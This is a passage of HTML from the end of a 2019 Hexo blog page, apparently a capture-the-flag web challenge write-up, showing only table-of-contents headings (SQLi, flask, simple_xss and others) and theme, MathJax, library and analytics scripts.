class="toc-number">6.3.</span> <span class="toc-text">SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar-matches-everything"><span class="toc-number">6.4.</span> <span class="toc-text">phar matches everything</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyphp"><span class="toc-number">6.5.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#replace"><span class="toc-number">6.6.</span> <span class="toc-text">replace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask"><span class="toc-number">6.7.</span> <span class="toc-text">flask</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-your-Shell"><span class="toc-number">6.8.</span> <span class="toc-text">Upload your Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask-website"><span class="toc-number">6.9.</span> <span class="toc-text">flask_website</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-xss"><span class="toc-number">6.10.</span> <span class="toc-text">simple_xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hacker-backdoor"><span class="toc-number">6.11.</span> <span class="toc-text">hacker_backdoor</span></a></li></ol></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2019
        <span class="gradient-text">
            Knlvre
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="knlvre.github.io/js/plugin.js"></script>
<script src="knlvre.github.io/js/obsidian.js"></script>
<script src="knlvre.github.io/js/jquery.truncate.js"></script>
<script src="knlvre.github.io/js/search.js"></script>
<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>



    <script src="knlvre.github.io/js/busuanzi.min.js"></script>
    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>


<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-149874671-1');
    </script>





<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["Think like an artist, develop like an artisan", "艺术家思维去思考问题，工匠创造精神去开发"],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
